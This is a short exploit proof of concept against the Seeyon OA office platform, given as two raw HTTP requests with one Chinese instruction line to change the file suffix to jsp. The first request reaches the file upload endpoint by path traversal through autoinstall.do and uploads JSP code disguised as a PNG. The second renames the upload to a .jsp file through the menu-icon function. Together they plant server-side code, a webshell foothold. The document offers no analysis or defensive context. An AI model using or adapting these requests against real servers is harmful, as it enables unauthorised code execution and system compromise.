```

POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
Host:
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: multipart/form-data; boundary=00content0boundary00 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)
Content-Length: 754

--00content0boundary00 
Content-Disposition: form-data; name="type"

--00content0boundary00
Content-Disposition: form-data; name="extensions"

png
--00content0boundary00
Content-Disposition: form-data; name="applicationCategory"

--00content0boundary00
Content-Disposition: form-data; name="destDirectory"

--00content0boundary00
Content-Disposition: form-data; name="destFilename"

--00content0boundary00
Content-Disposition: form-data; name="maxSize"

--00content0boundary00
Content-Disposition: form-data; name="isEncrypt"

false
--00content0boundary00
Content-Disposition: form-data; name="file1"; filename="1.png" Content-Type: Content-Type: application/pdf
<% out.println("hello");%> 
--00content0boundary00--
```





修改文件后缀为 jsp

```
POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1 
Host:
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 
Content-type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506) 
Content-Length: 64

method=uploadMenuIcon&fileid=ID 值&filename=qwe.jsp
```

